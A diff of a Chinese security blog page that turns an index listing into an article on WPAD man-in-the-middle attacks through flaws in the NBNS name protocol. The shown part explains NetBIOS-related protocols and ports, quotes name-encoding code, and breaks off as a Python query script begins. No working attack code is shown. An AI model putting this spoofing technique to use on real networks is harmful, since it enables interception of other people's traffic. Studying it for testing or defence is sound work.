@@ -6,15 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://eW1z4rd.github.io">
-  <title>eW1z4rd 树屋</title>
+  <title>利用 NBNS 协议缺陷进行 WPAD 中间人攻击 | eW1z4rd 树屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="eW1z4rd 树屋">
-<meta property="og:url" content="https://eW1z4rd.github.io/index.html">
+  <meta name="description" content="本文阐述了 NetBIOS 框架下的相关协议的区别， 重点对 NBNS 协议进行了分析，同时提出了针对 NBNS 协议缺陷进行 WPAD 中间人攻击的思路。 0x00 NetBIOS 相关协议NetBIOS（Network Basic Input/Output System，网络基本输入输出系统），一般指用于局域网通信的一套API（严格的说 NetBIOS 并不是一个网络协议），提供了一种允许局域">
+<meta name="keywords" content="内网渗透,exploit,concept">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用 NBNS 协议缺陷进行 WPAD 中间人攻击">
+<meta property="og:url" content="https://eW1z4rd.github.io/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/index.html">
 <meta property="og:site_name" content="eW1z4rd 树屋">
+<meta property="og:description" content="本文阐述了 NetBIOS 框架下的相关协议的区别， 重点对 NBNS 协议进行了分析，同时提出了针对 NBNS 协议缺陷进行 WPAD 中间人攻击的思路。 0x00 NetBIOS 相关协议NetBIOS（Network Basic Input/Output System，网络基本输入输出系统），一般指用于局域网通信的一套API（严格的说 NetBIOS 并不是一个网络协议），提供了一种允许局域">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://ew1z4rd.github.io/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/382300-20160109151303168-1561702700.gif">
+<meta property="og:image" content="https://ew1z4rd.github.io/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/382300-20160109151306934-1336561833.gif">
+<meta property="og:image" content="https://ew1z4rd.github.io/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/1562904209741.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/1562905742768.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/20171207135158-bd391ebe-db12-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/20171207135331-f46fc93c-db12-1.png">
+<meta property="og:updated_time" content="2019-08-11T05:36:25.340Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="eW1z4rd 树屋">
+<meta name="twitter:title" content="利用 NBNS 协议缺陷进行 WPAD 中间人攻击">
+<meta name="twitter:description" content="本文阐述了 NetBIOS 框架下的相关协议的区别， 重点对 NBNS 协议进行了分析，同时提出了针对 NBNS 协议缺陷进行 WPAD 中间人攻击的思路。 0x00 NetBIOS 相关协议NetBIOS（Network Basic Input/Output System，网络基本输入输出系统），一般指用于局域网通信的一套API（严格的说 NetBIOS 并不是一个网络协议），提供了一种允许局域">
+<meta name="twitter:image" content="https://ew1z4rd.github.io/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/382300-20160109151303168-1561702700.gif">
   
     <link rel="alternative" href="/atom.xml" title="eW1z4rd 树屋" type="application/atom+xml">
   
@@ -154,107 +166,27 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-WPAD-协议分析及内网渗透利用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-利用-NBNS-协议缺陷进行-WPAD-中间人攻击" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/08/WPAD-协议分析及内网渗透利用/">WPAD 协议分析及内网渗透利用</a>
+    <h1 class="article-title" itemprop="name">
+      利用 NBNS 协议缺陷进行 WPAD 中间人攻击
     </h1>
   
 
 		
 		<!--显示阅读次数-->
 		
-
-        
-        <a href="/2019/08/08/WPAD-协议分析及内网渗透利用/" class="archive-article-date">
-  	<time datetime="2019-08-08T13:15:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>本文将会阐述 WPAD 协议的工作原理、实现方式以及在内网渗透中的应用思路。</p>
-<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>WPAD 这项技术已经诞生了近十年的时间，其最大的优势就在于在一个或多个局域网中，当需要为内网中的用户设置不同的代理服务器去连接互联网或者企业内网时，利用  WPAD 就能够灵活方便的进行配置。由于配置代理服务器的方式对于用户来说是透明的，因此，攻击者就容易利用 WPAD 进行内网的渗透。</p>
-<p>可能是由于常规的内网渗透，如 Windows 域的渗透中，攻击者只需拿到域控的权限即可控制域中的任何机器，所以攻击者往往只关注如何抓到域管理员的 Hash，而即使在工作组的渗透中，也有着比 WPAD 更有效的攻击方式。因此，虽然利用 WPAD 进行内网渗透的技术已经出现了很多年了，但一直没有变得像 ARP Spoof 等攻击方式那么流行。但是在攻击者“无计可施”的时候，也会采用一些“非主流”的方式进行内网渗透，WPAD 可能造成的安全隐患，不容我们忽视。</p>
-        
-          <a class="article-more-a" href="/2019/08/08/WPAD-协议分析及内网渗透利用/#more">阅读全文 >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">exploit</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">concept</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-利用-NBNS-协议缺陷进行-WPAD-中间人攻击" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/">利用 NBNS 协议缺陷进行 WPAD 中间人攻击</a>
-    </h1>
-  
-
-		
-		<!--显示阅读次数-->
+		<br>
+		<a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+		<span class="icon-sort"></span>
+		<span id="busuanzi_container_page_pv" style="color:gray;font-size:14px;">
+			阅读数：<span id="busuanzi_value_page_pv"></span>次
+		</span>
+		</a>
 		
 
         
@@ -269,431 +201,75 @@ var _hmt = _hmt || [];
         <p>本文阐述了 NetBIOS 框架下的相关协议的区别， 重点对 NBNS 协议进行了分析，同时提出了针对 NBNS 协议缺陷进行 WPAD 中间人攻击的思路。</p>
 <h3 id="0x00-NetBIOS-相关协议"><a href="#0x00-NetBIOS-相关协议" class="headerlink" title="0x00 NetBIOS 相关协议"></a>0x00 NetBIOS 相关协议</h3><p><strong>NetBIOS（Network Basic Input/Output System，网络基本输入输出系统）</strong>，一般指用于局域网通信的一套<strong>API</strong>（严格的说 NetBIOS 并不是一个网络协议），提供了一种允许局域网内不同电脑能够建立和使用连接服务的功能。</p>
 <p><strong>NetBEUI（NetBIOS Enhanced User Interface，NetBIOS 增强用户接口）</strong>，可以看作是 NetBIOS 协议的<strong>扩展</strong>版本，主要用于小型局域网中的主机通信，目前基本已经淘汰。</p>
-        
-          <a class="article-more-a" href="/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/#more">阅读全文 >></a>
-        
-      
+<a id="more"></a>
 
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">exploit</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">concept</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-利用-LLMNR-名称解析缺陷劫持内网指定主机会话" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/02/利用-LLMNR-名称解析缺陷劫持内网指定主机会话/">利用 LLMNR 名称解析缺陷劫持内网指定主机会话</a>
-    </h1>
-  
-
-		
-		<!--显示阅读次数-->
-		
-
-        
-        <a href="/2019/08/02/利用-LLMNR-名称解析缺陷劫持内网指定主机会话/" class="archive-article-date">
-  	<time datetime="2019-08-02T14:30:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>本文将会对 LLMNR 协议进行分析并用 Python 实现质询和应答，之后重点阐述利用 LLMNR 在名称解析过程中的缺陷进行实战攻击的部分思路。</p>
-<h3 id="0x00-LLMNR-简介"><a href="#0x00-LLMNR-简介" class="headerlink" title="0x00 LLMNR 简介"></a>0x00 LLMNR 简介</h3><p>从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议——LLMNR，主要用于局域网中的名称解析。LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于  DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。</p>
-        
-          <a class="article-more-a" href="/2019/08/02/利用-LLMNR-名称解析缺陷劫持内网指定主机会话/#more">阅读全文 >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">exploit</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">concept</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Responder-内网渗透神器" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/24/Responder-内网渗透神器/">Responder 内网渗透神器</a>
-    </h1>
-  
-
-		
-		<!--显示阅读次数-->
-		
-
-        
-        <a href="/2019/07/24/Responder-内网渗透神器/" class="archive-article-date">
-  	<time datetime="2019-07-24T14:52:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Responder 工具是一款强大并且简单易用的内网渗透神器，可以劫持 LLMNR 和 NBT-NS 请求。</p>
-<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>工作原理是，在域名解析过程中，如果客户端/目标无法通过 DNS 进行域名解析，则会回退到 LLMNR 和 NBT-NS 协议下进行解析，在 Responder 运行的情况下，会对所有能收到的 LLMNR 和 NBT-NS 请求进行欺骗性响应，然后将所有的数据流导向到攻击者的机器。</p>
-        
-          <a class="article-more-a" href="/2019/07/24/Responder-内网渗透神器/#more">阅读全文 >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">tools</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Hexo-yilia-主题优化方案" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/20/Hexo-yilia-主题优化方案/">Hexo yilia 主题优化方案</a>
-    </h1>
-  
-
-		
-		<!--显示阅读次数-->
-		
-
-        
-        <a href="/2019/07/20/Hexo-yilia-主题优化方案/" class="archive-article-date">
-  	<time datetime="2019-07-20T08:23:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Hexo 虽然好用，但配置主题时遇到的坑确实是挺多的，网上大部分的回答都是复制粘贴、良莠不齐，所以把自己优化 yilia 主题的过程整理了一下，希望后来的人可以少走弯路🙂。</p>
-<h3 id="Hexo-主题优化"><a href="#Hexo-主题优化" class="headerlink" title="Hexo 主题优化"></a>Hexo 主题优化</h3><p><strong>修改 Hexo 配置文件</strong><br>配置根目录下的 <code>_config.yml</code> ：</p>
-        
-          <a class="article-more-a" href="/2019/07/20/Hexo-yilia-主题优化方案/#more">阅读全文 >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Windows-名称解析机制探究及缺陷利用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/16/Windows-名称解析机制探究及缺陷利用/">Windows 名称解析机制探究及缺陷利用</a>
-    </h1>
-  
-
-		
-		<!--显示阅读次数-->
-		
-
-        
-        <a href="/2019/07/16/Windows-名称解析机制探究及缺陷利用/" class="archive-article-date">
-  	<time datetime="2019-07-16T11:32:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>本文阐述了 Windows 系统中的名称解析机制，同时也提及了几种利用名称解析机制的缺陷进行内网攻击的方式。</p>
-<h3 id="0x00-Windows-名称解析简介"><a href="#0x00-Windows-名称解析简介" class="headerlink" title="0x00 Windows 名称解析简介"></a>0x00 Windows 名称解析简介</h3><p>TCP 协议的通信是基于 IP 地址的，“名称解析”就是把需要访问的计算机的名字解析为 IP 地址的过程。</p>
-<p><strong>Windows 中的名称类型</strong></p>
-<p>在 Windows 操作系统中有两种名称，分别为：<strong>主机名称</strong> 和 <strong>NetBIOS 名称</strong>。</p>
-        
-          <a class="article-more-a" href="/2019/07/16/Windows-名称解析机制探究及缺陷利用/#more">阅读全文 >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Windows</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">exploit</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">concept</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Learn-Git-04-其他特性" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/16/Learn-Git-04-其他特性/">Learn Git 04 其他特性</a>
-    </h1>
-  
-
-		
-		<!--显示阅读次数-->
-		
-
-        
-        <a href="/2019/06/16/Learn-Git-04-其他特性/" class="archive-article-date">
-  	<time datetime="2019-06-16T02:49:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="0x07-标签管理"><a href="#0x07-标签管理" class="headerlink" title="0x07 标签管理"></a>0x07 标签管理</h3><p>标签<code>tag</code>就是一个让人容易记住的有意义的名字，它可以跟某个<code>commit</code>绑定在一起。</p>
-<p>发布一个版本时，我们通常先在版本库中打一个标签，将来无论什么时候要取出某个版本，都可以根据标签找到需要的历史版本。所以，标签也是版本库的一个快照。</p>
 <blockquote>
-<p>Git的标签虽然是版本库的快照，但其实它是指向某个<code>commit</code>的指针。这和分支很像，但是分支可以移动，而标签不能移动。所以，创建和删除标签在Git中都是瞬间完成的。</p>
+<p>注：NetBIOS 和 NetBEUI，都是基于以太网广播的，也就是只能识别 MAC 地址，没有更高层的协议头部（如 IP、TCP/UDP），所以是无法通过路由器的。</p>
 </blockquote>
-        
-          <a class="article-more-a" href="/2019/06/16/Learn-Git-04-其他特性/#more">阅读全文 >></a>
-        
+<p><strong>NBT（NetBIOS over TCP/IP，简称 NBT 或者 NetBT）</strong>，是一个网络协议，允许以前使用 NetBIOS API 的应用程序能够在 TCP/IP 协议栈中使用。如今，NBT 已经逐渐地<strong>代替</strong> NetBIOS 成为主流协议，因为它不仅适用于以太网，更适用于现代的 TCP/IP 网络。</p>
+<blockquote>
+<p><em>Wireshark</em> 中是这样解释的：<em>NetBIOS over TCP/IP (also called NBT) seems to slowly supersede all the other NetBIOS variants.</em></p>
+<p>译：NetBIOS over TCP/IP 也叫做 NBT，已经逐渐淘汰并取代其他的 NetBIOS 变形协议或扩展协议。</p>
+</blockquote>
+<p>NetBIOS 和 NBT 的具体关系如图所示：</p>
+<p><img src="/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/382300-20160109151303168-1561702700.gif" alt="img"></p>
+<p>图1：NetBIOS over TCP/IP 协议栈</p>
+<p>如上图所示，<strong>NBT 是一个框架</strong>，提供了三种不同的服务，即 <strong>NBNS、NBDS、NBSS</strong> 三个协议。</p>
+<blockquote>
+<p>注：在使用 Wireshark 等抓包工具来捕获数据包时，是抓不到 NBT 协议的数据包的，只能抓到 NBNS、NBDS、NBSS 这三种协议的数据包。</p>
+</blockquote>
+<p>协议的具体描述如下：</p>
+<ul>
+<li><p><strong>NBNS（NetBIOS Name Service，NetBIOS 名称服务器）</strong>，类似于 DNS 服务，使用 UDP/137 或 TCP/137 端口，在基于 NetBIOS 名称访问的网络上提供名称注册和名称解析服务，<strong>通常也被称为 NBT-NS</strong>。关闭 137 端口，则无法使用 WINS 服务。</p>
+<blockquote>
+<p>Microsoft 的 NBNS 实现称为 WINS（Windows Internet Name Service，Windows网络名称服务）</p>
+</blockquote>
+</li>
+<li><p><strong>NDNS（NetBIOS Datagram Service，NetBIOS 数据报服务器）</strong>，使用 UDP/138 端口，主要用于提供 NetBIOS 环境下的计算机名浏览功能，很少使用。</p>
+<blockquote>
+<p>如果非法入侵者可以与目标主机的 138 端口建立连接请求，就能轻易获得目标主机所处的局域网网络名称以及目标主机的计算机名称。</p>
+</blockquote>
+</li>
+<li><p><strong>NBSS（NetBIOS Session Service，NetBIOS 会话服务器）</strong>，使用 TCP/139 端口建立可靠的、基于连接的通信，主要用于 Windows “文件和打印机共享” 和 Linux Samba 服务。关闭 139 端口，则无法在 PC 间共享文件和打印机。</p>
+</li>
+</ul>
+<p><strong>SMB（Server Message Block，服务器信息块）</strong>，是一个应用层的协议，主要用于提供网络中文件共享、文件打印和进程间通信等功能，如今 SMB 主要使用于 Windows 系统中。</p>
+<p>SMB 协议有两种运行方式，第一种通过 NetBIOS API，使用的是 UDP/137 和 UDP/138 端口以及 TCP/137 和 TCP/139 端口，如下图所示：</p>
+<p><img src="/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/382300-20160109151306934-1336561833.gif" alt="img"></p>
+<p>图2：使用 NetBIOS 实现的 SMB</p>
+<p>第二种是直接运行在 TCP 和 UDP 协议之上，使用的是 <strong>445</strong> 端口，也被称为*”Direct hosting of SMB over TCP/IP”*。</p>
+<blockquote>
+<p>默认 Windows 系统都支持 SMB 协议，Linux 系统没有相关组件，需要使用 Samba 服务实现 SMB 协议。</p>
+</blockquote>
+<h3 id="0x01-NBNS-协议分析"><a href="#0x01-NBNS-协议分析" class="headerlink" title="0x01 NBNS 协议分析"></a>0x01 NBNS 协议分析</h3><p>NetBIOS 协议的概念定义在 <a href="https://tools.ietf.org/html/rfc1001" target="_blank" rel="noopener">RFC 1001</a> 中、实现细节定义在 <a href="https://tools.ietf.org/html/rfc1002" target="_blank" rel="noopener">RFC 1002</a> 中，文档里详细的介绍了有关于 NetBIOS、NBNS 协议的结构，配置以及安全性等内容。</p>
+<p><strong>NBNS 的协议结构如下图所示：</strong></p>
+<p><img src="/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/1562904209741.png" alt="1562904209741"></p>
+<p>图3：NBNS 协议结构</p>
+<p>NBNS 的协议结构与 LLMNR 基本一致，可以参考 [利用 LLMNR 名称解析缺陷劫持内网指定主机会话](./利用 LLMNR 名称解析缺陷劫持内网指定主机会话) 中对 LLMNR 协议的解析。不同之处在于 NBNS 协议中的主机名称是经过<strong>编码</strong>的，而 LLMNR 中是以明文传递，在 Python 的 dpkt 库中有实现其编码和解码的源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_name</span><span class="params">(name)</span>:</span></span><br><span class="line"><span class="string">"""Return the NetBIOS first-level encoded name."""</span></span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> struct.pack(<span class="string">'16s'</span>, name):</span><br><span class="line">    c = ord(c)</span><br><span class="line">    l.append(chr((c &gt;&gt; <span class="number">4</span>) + <span class="number">0x41</span>))</span><br><span class="line">    l.append(chr((c &amp; <span class="number">0xf</span>) + <span class="number">0x41</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join(l)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_name</span><span class="params">(nbname)</span>:</span></span><br><span class="line"><span class="string">"""Return the NetBIOS first-level decoded nbname."""</span></span><br><span class="line"><span class="keyword">if</span> len(nbname) != <span class="number">32</span>:</span><br><span class="line">    <span class="keyword">return</span> nbname</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">32</span>, <span class="number">2</span>):</span><br><span class="line">    l.append(chr(((ord(nbname[i]) - <span class="number">0x41</span>) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">                 ((ord(nbname[i+<span class="number">1</span>]) - <span class="number">0x41</span>) &amp; <span class="number">0xf</span>)))</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join(l).split(<span class="string">'\x00'</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+
+<p>使用 Wireshark 可以快速抓取到 NBNS 协议的数据包，如下图：</p>
+<p><img src="/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/1562905742768.png" alt="1562905742768"></p>
+<p>图4：经过编码后的主机名称</p>
+<h3 id="0x02-NBNS-名称解析过程"><a href="#0x02-NBNS-名称解析过程" class="headerlink" title="0x02 NBNS 名称解析过程"></a>0x02 NBNS 名称解析过程</h3><p>NBNS 名称解析的具体过程可以查看 [Windows 名称解析机制探究及缺陷利用](./Windows 名称解析机制探究及缺陷利用)，一种常见的名称解析过程及利用如下图所示：</p>
+<p><img src="/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/20171207135158-bd391ebe-db12-1.png" alt="img"></p>
+<p>图5：NetBIOS 名称解析过程 </p>
+<h3 id="0x03-Python-实现-NetBIOS-协议的质询与应答"><a href="#0x03-Python-实现-NetBIOS-协议的质询与应答" class="headerlink" title="0x03 Python 实现 NetBIOS 协议的质询与应答"></a>0x03 Python 实现 NetBIOS 协议的质询与应答</h3><p>NBNS 协议的质询过程实际上就是进行了一个广播，质询的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 